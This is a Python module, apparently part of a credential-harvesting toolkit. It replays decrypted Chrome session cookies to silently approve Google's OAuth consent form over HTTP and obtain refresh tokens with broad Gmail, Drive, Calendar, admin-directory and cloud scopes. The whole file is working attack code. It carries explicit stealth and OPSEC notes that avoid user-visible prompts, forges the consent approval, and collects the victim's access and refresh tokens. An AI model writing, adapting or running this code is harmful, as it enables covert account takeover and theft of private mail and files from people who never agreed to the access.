"""HTTP-only OAuth flow using stolen Chrome cookies — no browser launch.

Completes the Google OAuth consent flow entirely over HTTP using urllib,
by replaying decrypted Chrome cookies from the chromium_decrypt module.
The user's active Google session (SID/HSID/SSID cookies) authenticates
the consent page, and we POST the approval form programmatically.

OPSEC:
  - Windows/Linux ONLY (Chrome cookie decrypt is SILENT via DPAPI/peanuts)
  - macOS: SKIPPED — Keychain prompt is user-visible
  - Stealth 5: no browser window, no CDP, no Keychain dialog
  - Pure stdlib: urllib + http.cookiejar + re (no selenium, no requests)

Flow:
  1. Read ~/.config/gws/client_secret.json for OAuth client_id/client_secret
  2. Decrypt Chrome cookies for .google.com / accounts.google.com (silent)
  3. GET the OAuth authorization URL with cookies attached
  4. Parse the consent HTML for hidden form fields (CSRF tokens, session state)
  5. POST the consent form to approve the scopes
  6. Capture the auth code from the redirect Location header
  7. Exchange auth code for refresh_token + access_token via token endpoint
"""

from __future__ import annotations

import http.cookiejar
import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import home_dir, get_platform

TOKEN_ENDPOINT = "https://oauth2.googleapis.com/token"
OAUTH_AUTH_URL = "https://accounts.google.com/o/oauth2/auth"

# Redirect URI for installed apps — Google intercepts this and shows the code
# in the page title / body instead of actually redirecting to localhost.
REDIRECT_URI_OOB = "urn:ietf:wg:oauth:2.0:oob"
# Loopback redirect — Google redirects to http://127.0.0.1:<port> but we
# use a special URI that makes Google show the code directly.
REDIRECT_URI_LOCAL = "http://127.0.0.1"

# Workspace scopes (same as gws_cli.py)
GWS_SCOPES = [
    "openid",
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/userinfo.profile",
    "https://www.googleapis.com/auth/gmail.readonly",
    "https://www.googleapis.com/auth/drive.readonly",
    "https://www.googleapis.com/auth/calendar.readonly",
    "https://www.googleapis.com/auth/admin.directory.user.readonly",
    "https://www.googleapis.com/auth/admin.directory.group.readonly",
    "https://www.googleapis.com/auth/chat.messages.readonly",
    "https://www.googleapis.com/auth/chat.spaces.readonly",
    "https://www.googleapis.com/auth/cloud-platform",
]

# Cookie names needed for Google account session
_SESSION_COOKIE_NAMES = {
    "SID", "HSID", "SSID", "APISID", "SAPISID",
    "__Secure-1PSID", "__Secure-3PSID",
    "NID", "OSID", "LSID",
    "__Secure-1PAPISID", "__Secure-3PAPISID",
    "__Secure-1PSIDTS", "__Secure-3PSIDTS",
    "__Secure-1PSIDCC", "__Secure-3PSIDCC",
}


def _gws_dir() -> Path:
    return home_dir() / ".config" / "gws"


class _NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Capture redirect responses instead of following them.

    Used to intercept the OAuth callback redirect and extract the auth code
    from the Location header without actually following it.
    """

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        # Store the redirect URL on the response so the caller can read it
        raise _RedirectCaptured(newurl, code)


class _RedirectCaptured(urllib.error.HTTPError):
    """Raised when a redirect is captured instead of followed."""

    def __init__(self, url: str, code: int):
        self.redirect_url = url
        self.code = code
        self.msg = f"Redirect to {url}"
        self.hdrs = {}  # type: ignore[assignment]
        self.fp = None


@CollectorRegistry.register
class HttpOAuthCollector(BaseCollector):
    """Collect Google OAuth tokens via HTTP-only flow using stolen Chrome cookies.

    No browser window, no CDP, no Keychain prompt. Pure HTTP with urllib.
    """

    service = "google"
    source = "http_oauth"
    stealth_score = 5
    requires = ["cryptography"]
    platforms = ["windows", "linux"]

    def _read_client_secret(self) -> Optional[dict]:
        """Read OAuth client_id/secret from gws-cli's client_secret.json."""
        path = _gws_dir() / "client_secret.json"
        if not path.exists():
            return None
        try:
            data = json.loads(path.read_text())
            installed = data.get("installed", {})
            if installed.get("client_id") and installed.get("client_secret"):
                return {
                    "client_id": installed["client_id"],
                    "client_secret": installed["client_secret"],
                }
        except (json.JSONDecodeError, KeyError):
            pass
        return None

    def _build_cookie_jar(
        self, cookies: List[Dict[str, str]]
    ) -> http.cookiejar.CookieJar:
        """Convert decrypted Chrome cookies into an http.cookiejar.CookieJar.

        This lets urllib.request.HTTPCookieProcessor handle cookie sending
        and receiving automatically, including Set-Cookie from Google's
        consent flow.
        """
        jar = http.cookiejar.CookieJar()

        for c in cookies:
            host = c["host"]
            # Chrome stores domain cookies with a leading dot
            domain = host if host.startswith(".") else host
            initial_dot = domain.startswith(".")

            # Convert Chrome expires (microseconds since 1601-01-01) to unix epoch
            # Chrome epoch offset: Jan 1, 1601 to Jan 1, 1970 in seconds
            chrome_epoch_offset = 11644473600
            expires_raw = c.get("expires", 0)
            if expires_raw and int(expires_raw) > 0:
                # Chrome stores in microseconds since 1601-01-01
                expires_unix = int(expires_raw) / 1_000_000 - chrome_epoch_offset
                if expires_unix < 0:
                    expires_unix = None
            else:
                expires_unix = None

            cookie = http.cookiejar.Cookie(
                version=0,
                name=c["name"],
                value=c["value"],
                port=None,
                port_specified=False,
                domain=domain,
                domain_specified=bool(initial_dot),
                domain_initial_dot=initial_dot,
                path=c.get("path", "/"),
                path_specified=True,
                secure=c.get("secure", False),
                expires=int(expires_unix) if expires_unix else None,
                discard=expires_unix is None,
                comment=None,
                comment_url=None,
                rest={"HttpOnly": ""} if c.get("httponly") else {},
            )
            jar.set_cookie(cookie)

        return jar

    def _build_cookie_header(self, cookies: List[Dict[str, str]]) -> str:
        """Build a Cookie header string from decrypted cookies.

        Fallback for manual header construction when cookiejar doesn't
        send all cookies (e.g., __Secure- prefix cookies).
        """
        parts = []
        for c in cookies:
            if c["value"]:
                parts.append(f"{c['name']}={c['value']}")
        return "; ".join(parts)

    def _build_opener(
        self, cookies: List[Dict[str, str]], follow_redirects: bool = True
    ) -> Tuple[urllib.request.OpenerDirector, str]:
        """Build a urllib opener with cookie support.

        Returns (opener, cookie_header_string).
        The cookie_header_string is used as a manual fallback for secure
        cookies that CookieJar may not send.
        """
        jar = self._build_cookie_jar(cookies)
        cookie_processor = urllib.request.HTTPCookieProcessor(jar)

        handlers = [cookie_processor]
        if not follow_redirects:
            handlers.append(_NoRedirectHandler())

        opener = urllib.request.build_opener(*handlers)

        # Also build manual cookie header as fallback
        cookie_header = self._build_cookie_header(cookies)

        return opener, cookie_header

    def _extract_form_fields(self, html: str) -> Dict[str, str]:
        """Extract all hidden input fields from an HTML form.

        Parses <input type="hidden" name="..." value="..."> using regex.
        Handles both single and double quotes, and missing value attributes.
        """
        fields = {}

        # Match hidden inputs with various quoting styles
        patterns = [
            # type="hidden" name="X" value="Y"
            r'<input[^>]*\btype=["\']hidden["\'][^>]*\bname=["\']([^"\']+)["\'][^>]*\bvalue=["\']([^"\']*)["\']',
            # name="X" value="Y" type="hidden"
            r'<input[^>]*\bname=["\']([^"\']+)["\'][^>]*\bvalue=["\']([^"\']*)["\'][^>]*\btype=["\']hidden["\']',
            # name="X" type="hidden" value="Y"
            r'<input[^>]*\bname=["\']([^"\']+)["\'][^>]*\btype=["\']hidden["\'][^>]*\bvalue=["\']([^"\']*)["\']',
            # value="Y" type="hidden" name="X" (reorder)
            r'<input[^>]*\bvalue=["\']([^"\']*)["\'][^>]*\btype=["\']hidden["\'][^>]*\bname=["\']([^"\']+)["\']',
        ]

        for pattern in patterns:
            for match in re.finditer(pattern, html, re.IGNORECASE | re.DOTALL):
                groups = match.groups()
                if pattern == patterns[3]:
                    # value comes before name in this pattern
                    fields[groups[1]] = groups[0]
                else:
                    fields[groups[0]] = groups[1]

        return fields

    def _extract_form_action(self, html: str) -> Optional[str]:
        """Extract the form action URL from the consent page HTML."""
        # Look for form with action containing "signin/oauth"
        match = re.search(
            r'<form[^>]*\baction=["\']([^"\']+)["\']',
            html, re.IGNORECASE | re.DOTALL,
        )
        if match:
            action = match.group(1)
            # Unescape HTML entities
            action = action.replace("&amp;", "&")
            return action
        return None

    def _extract_auth_code_from_url(self, url: str) -> Optional[str]:
        """Extract the authorization code from a redirect URL."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if "code" in params:
            return params["code"][0]
        # Also check fragment (hash)
        frag_params = urllib.parse.parse_qs(parsed.fragment)
        if "code" in frag_params:
            return frag_params["code"][0]
        return None

    def _extract_auth_code_from_html(self, html: str) -> Optional[str]:
        """Extract auth code from the OOB success page HTML.

        Google shows the auth code in a <textarea> or in the page title
        when using urn:ietf:wg:oauth:2.0:oob redirect URI.
        """
        # Try textarea with id="code"
        match = re.search(
            r'<textarea[^>]*\bid=["\']code["\'][^>]*>([^<]+)</textarea>',
            html, re.IGNORECASE,
        )
        if match:
            return match.group(1).strip()

        # Try input with id="code"
        match = re.search(
            r'<input[^>]*\bid=["\']code["\'][^>]*\bvalue=["\']([^"\']+)["\']',
            html, re.IGNORECASE,
        )
        if match:
            return match.group(1).strip()

        # Try title containing "code="
        match = re.search(
            r'<title>[^<]*code=([^<&\s]+)',
            html, re.IGNORECASE,
        )
        if match:
            return match.group(1).strip()

        # Try "Success code=" pattern in page body
        match = re.search(
            r'Success\s+code=([A-Za-z0-9/_\-]+)',
            html, re.IGNORECASE,
        )
        if match:
            return match.group(1).strip()

        # Generic: look for 4/ prefix auth codes (Google format)
        match = re.search(
            r'["\'>](4/[A-Za-z0-9_\-]{20,})["\']',
            html,
        )
        if match:
            return match.group(1).strip()

        return None

    def _detect_consent_state(self, html: str) -> str:
        """Detect what state the consent page is in.

        Returns:
            'consent' — consent form is shown, can be auto-submitted
            'login'   — login form shown, user not authenticated
            'error'   — an error page
            'approved' — already approved (auto-redirect happened)
            'unknown' — unrecognized page
        """
        html_lower = html.lower()

        # Check for login page (not authenticated)
        if "identifier" in html_lower and "type=\"email\"" in html_lower:
            return "login"
        if "sign in" in html_lower and "email or phone" in html_lower:
            return "login"

        # Check for error messages
        if "error" in html_lower and "access_denied" in html_lower:
            return "error"
        if "that's an error" in html_lower:
            return "error"

        # Check for consent/approval page
        # Google consent pages contain submit_approve buttons or grant approval forms
        if "submit_approve_access" in html or "approve" in html_lower:
            return "consent"
        if "consent" in html_lower and ("allow" in html_lower or "grant" in html_lower):
            return "consent"

        # Check if already approved (auth code in page)
        if "4/" in html or "code=" in html_lower:
            return "approved"

        return "unknown"

    def discover(self) -> List[DiscoveredToken]:
        """Check for client_secret.json and Chrome cookies."""
        results = []

        # Need client_secret.json
        client = self._read_client_secret()
        if not client:
            return results

        # Check Chrome cookies exist (without decrypting)
        from ...platform_utils import chrome_user_data_dir
        chrome_dir = chrome_user_data_dir()

        profiles_with_cookies = []
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 6)]:
            cookies_db = chrome_dir / profile / "Cookies"
            if not cookies_db.exists():
                cookies_db = chrome_dir / profile / "Network" / "Cookies"
            if cookies_db.exists():
                profiles_with_cookies.append(profile)

        if not profiles_with_cookies:
            return results

        path = _gws_dir() / "client_secret.json"
        results.append(DiscoveredToken(
            service=self.service,
            source=self.source,
            path=str(path),
            account_hint=f"client_id={client['client_id'][:25]}...",
            stealth_score=self.stealth_score,
            details=(
                f"HTTP-only OAuth via Chrome cookies — no browser launch; "
                f"profiles: {', '.join(profiles_with_cookies)}; "
                f"platform={get_platform()}"
            ),
        ))

        return results

    def collect(self) -> List[CollectedToken]:
        """Execute the full HTTP-only OAuth flow.

        1. Read client_secret.json
        2. Decrypt Chrome cookies (silent on Windows/Linux)
        3. GET OAuth consent URL with cookies
        4. Parse and POST consent form
        5. Capture auth code from redirect
        6. Exchange for tokens
        """
        missing = self.check_dependencies()
        if missing:
            self._warn(
                f"Missing dependencies: {', '.join(missing)}. "
                f"Install with: pip install {' '.join(missing)}"
            )
            return []

        # 1. Read client credentials
        client = self._read_client_secret()
        if not client:
            self._warn("~/.config/gws/client_secret.json not found or invalid")
            return []

        self._info("Starting HTTP-only OAuth flow (no browser)...")

        # 2. Get Chrome encryption key (silent on Windows/Linux)
        from ...core.chromium_decrypt import extract_cookies, get_chrome_key, DecryptError

        try:
            key = get_chrome_key(allow_prompt=False)
        except DecryptError as e:
            self._warn(f"Cannot get Chrome key: {e}")
            return []

        # 3. Try each Chrome profile
        results = []
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 6)]

        for profile in profiles:
            token = self._try_profile(profile, key, client)
            if token:
                results.append(token)
                # One successful token is enough — break to avoid duplicate
                # consent approvals on the same account
                break

        return results

    def _try_profile(
        self, profile: str, key: bytes, client: dict
    ) -> Optional[CollectedToken]:
        """Attempt the HTTP OAuth flow using cookies from a specific Chrome profile."""
        from ...core.chromium_decrypt import extract_cookies, DecryptError

        self._info(f"Trying profile: {profile}")

        # Extract Google cookies
        try:
            cookies = extract_cookies(
                profile=profile,
                host_patterns=[".google.com", "accounts.google.com"],
                key=key,
            )
        except DecryptError as e:
            self._warn(f"Cookie extraction failed for {profile}: {e}")
            return None
        except Exception as e:
            self._warn(f"Unexpected error for {profile}: {e}")
            return None

        if not cookies:
            self._info(f"No Google cookies in {profile}")
            return None

        # Check we have session cookies (at least SID or __Secure-1PSID)
        cookie_names = {c["name"] for c in cookies}
        has_session = bool(cookie_names & {"SID", "__Secure-1PSID", "OSID"})
        if not has_session:
            self._info(f"No session cookies in {profile} (have: {cookie_names & _SESSION_COOKIE_NAMES})")
            return None

        self._info(
            f"Found {len(cookies)} Google cookies in {profile} "
            f"(session: {sorted(cookie_names & _SESSION_COOKIE_NAMES)})"
        )

        # Build OAuth URL — use OOB redirect so Google shows code in page
        scope = " ".join(GWS_SCOPES)
        auth_params = {
            "client_id": client["client_id"],
            "redirect_uri": REDIRECT_URI_OOB,
            "response_type": "code",
            "scope": scope,
            "access_type": "offline",
            "prompt": "consent",
        }
        auth_url = OAUTH_AUTH_URL + "?" + urllib.parse.urlencode(
            auth_params, quote_via=urllib.parse.quote
        )

        # Build opener with cookies
        opener, cookie_header = self._build_opener(cookies, follow_redirects=True)

        # 4. GET the consent page
        self._info("Fetching OAuth consent page with stolen cookies...")
        try:
            req = urllib.request.Request(auth_url)
            # Set manual cookie header as well — CookieJar may skip __Secure- cookies
            req.add_header("Cookie", cookie_header)
            req.add_header("User-Agent", (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/131.0.0.0 Safari/537.36"
            ))
            req.add_header("Accept", "text/html,application/xhtml+xml,*/*")
            req.add_header("Accept-Language", "en-US,en;q=0.9")

            resp = opener.open(req, timeout=30)
            html = resp.read().decode("utf-8", errors="replace")
            final_url = resp.url
        except urllib.error.HTTPError as e:
            self._warn(f"HTTP error fetching consent page: {e.code} {e.reason}")
            return None
        except urllib.error.URLError as e:
            self._warn(f"Network error fetching consent page: {e}")
            return None

        # Check if we got redirected directly to the auth code (already approved)
        if final_url and "code=" in final_url:
            auth_code = self._extract_auth_code_from_url(final_url)
            if auth_code:
                self._info("Scopes already approved — auth code captured from redirect!")
                return self._exchange_and_build_token(auth_code, client, profile)

        # Check page state
        state = self._detect_consent_state(html)
        self._info(f"Consent page state: {state}")

        if state == "login":
            self._warn(
                f"Google session expired in {profile} — cookies are stale. "
                f"User needs to log in to Chrome first."
            )
            return None

        if state == "error":
            self._warn(f"Google returned an error page for {profile}")
            return None

        if state == "approved":
            # Auth code is in the page HTML
            auth_code = self._extract_auth_code_from_html(html)
            if auth_code:
                self._info("Auth code found in page (previously approved scopes)")
                return self._exchange_and_build_token(auth_code, client, profile)
            self._warn("Page appears approved but could not extract auth code")
            return None

        if state == "consent":
            return self._submit_consent(html, final_url, opener, cookie_header, client, profile)

        # Unknown state — try to find a form anyway
        self._info("Unknown page state — attempting form extraction...")
        return self._submit_consent(html, final_url, opener, cookie_header, client, profile)

    def _submit_consent(
        self,
        html: str,
        page_url: str,
        opener: urllib.request.OpenerDirector,
        cookie_header: str,
        client: dict,
        profile: str,
    ) -> Optional[CollectedToken]:
        """Parse the consent form and submit it to approve scopes."""

        # Extract hidden form fields
        fields = self._extract_form_fields(html)
        if not fields:
            self._warn(
                "Could not find hidden form fields in consent page. "
                "This may be a new consent format or the session is invalid. "
                "Falling back: try gws_cli collector for interactive flow."
            )
            return None

        self._info(f"Found {len(fields)} hidden form fields: {list(fields.keys())}")

        # Extract form action URL
        action_url = self._extract_form_action(html)
        if not action_url:
            # Default consent submission endpoint
            action_url = "https://accounts.google.com/signin/oauth/consent"

        # Make absolute URL if relative
        if action_url.startswith("/"):
            action_url = "https://accounts.google.com" + action_url

        # Add the approval button field — Google uses submit_approve_access
        fields["submit_approve_access"] = "true"

        # Some consent forms use a "bgresponse" field for bot detection
        # and a "checkedDomains" field — set reasonable defaults
        if "bgresponse" not in fields:
            fields["bgresponse"] = "js_disabled"

        self._info(f"Submitting consent form to: {action_url}")

        # POST the consent form
        post_data = urllib.parse.urlencode(fields).encode("utf-8")

        # Build a no-redirect opener to capture the redirect with the auth code
        from ...core.chromium_decrypt import extract_cookies as _ec
        no_redirect_opener, _ = self._build_opener([], follow_redirects=False)

        # Copy cookies from the main opener's jar
        req = urllib.request.Request(action_url, data=post_data)
        req.add_header("Cookie", cookie_header)
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/131.0.0.0 Safari/537.36"
        ))
        req.add_header("Referer", page_url)
        req.add_header("Origin", "https://accounts.google.com")
        req.add_header("Accept", "text/html,application/xhtml+xml,*/*")

        auth_code = None

        # First, try with the main opener (follows redirects)
        try:
            resp = opener.open(req, timeout=30)
            resp_html = resp.read().decode("utf-8", errors="replace")
            final_url = resp.url

            # Check if redirect URL contains auth code
            if final_url and "code=" in final_url:
                auth_code = self._extract_auth_code_from_url(final_url)

            # Check HTML body for auth code (OOB flow)
            if not auth_code:
                auth_code = self._extract_auth_code_from_html(resp_html)

        except _RedirectCaptured as e:
            # Captured a redirect — extract auth code from Location
            if "code=" in e.redirect_url:
                auth_code = self._extract_auth_code_from_url(e.redirect_url)
            else:
                self._info(f"Redirect captured but no code: {e.redirect_url[:100]}")

        except urllib.error.HTTPError as e:
            # 302/303 redirects may come as HTTPError with Location header
            location = e.headers.get("Location", "") if hasattr(e, "headers") else ""
            if location and "code=" in location:
                auth_code = self._extract_auth_code_from_url(location)
            else:
                # Try reading the error response body
                try:
                    err_body = e.read().decode("utf-8", errors="replace")
                    auth_code = self._extract_auth_code_from_html(err_body)
                except Exception:
                    pass

                if not auth_code:
                    self._warn(f"Consent POST failed: {e.code} {e.reason}")
                    if location:
                        self._info(f"Redirect Location: {location[:200]}")
                    return None

        except urllib.error.URLError as e:
            self._warn(f"Network error submitting consent: {e}")
            return None

        if not auth_code:
            self._warn(
                "Consent form submitted but no auth code received. "
                "Possible causes: new scopes never previously approved, "
                "CAPTCHA challenge, or changed consent flow format. "
                "Use gws_cli collector for interactive browser flow."
            )
            return None

        self._info("Auth code captured from consent form submission!")
        return self._exchange_and_build_token(auth_code, client, profile)

    def _exchange_and_build_token(
        self, auth_code: str, client: dict, profile: str
    ) -> Optional[CollectedToken]:
        """Exchange the auth code for tokens and build a CollectedToken."""
        self._info("Exchanging auth code for tokens...")

        token_data = self._exchange_code(auth_code, client)
        if not token_data:
            return None

        # Extract email from ID token
        email = None
        id_token = token_data.get("id_token", "")
        if id_token:
            email = self._decode_email(id_token)

        token = CollectedToken(
            service=self.service,
            source=self.source,
            stealth_score=self.stealth_score,
            account_id=email,
            username=email,
            access_token=secure(token_data.get("access_token", "")),
            refresh_token=secure(token_data.get("refresh_token", "")),
            client_id=client["client_id"],
            client_secret=secure(client["client_secret"]),
            token_uri=TOKEN_ENDPOINT,
            scopes=token_data.get("scope", "").split(),
            expires_at=token_data.get("expires_in"),
            extra={
                "grant_type": "authorization_code",
                "flow": "http_oauth",
                "profile": profile,
                "no_browser": True,
                "gws_cli": True,
            },
        )

        self._info(
            f"SUCCESS — HTTP-only OAuth token for {email or 'unknown'} "
            f"(profile: {profile}, no browser launched)"
        )
        return token

    def _exchange_code(self, code: str, client: dict) -> Optional[dict]:
        """Exchange authorization code for access/refresh tokens."""
        data = urllib.parse.urlencode({
            "code": code,
            "client_id": client["client_id"],
            "client_secret": client["client_secret"],
            "redirect_uri": REDIRECT_URI_OOB,
            "grant_type": "authorization_code",
        }).encode()

        req = urllib.request.Request(
            TOKEN_ENDPOINT,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read())
        except urllib.error.HTTPError as e:
            try:
                err_body = e.read().decode()
                self._warn(f"Token exchange failed: {e.code} — {err_body[:200]}")
            except Exception:
                self._warn(f"Token exchange failed: {e.code} {e.reason}")
            return None
        except urllib.error.URLError as e:
            self._warn(f"Token exchange network error: {e}")
            return None

    @staticmethod
    def _decode_email(id_token: str) -> Optional[str]:
        """Decode email from JWT ID token (no verification — just base64)."""
        import base64
        parts = id_token.split(".")
        if len(parts) < 2:
            return None
        try:
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            return payload.get("email")
        except Exception:
            return None
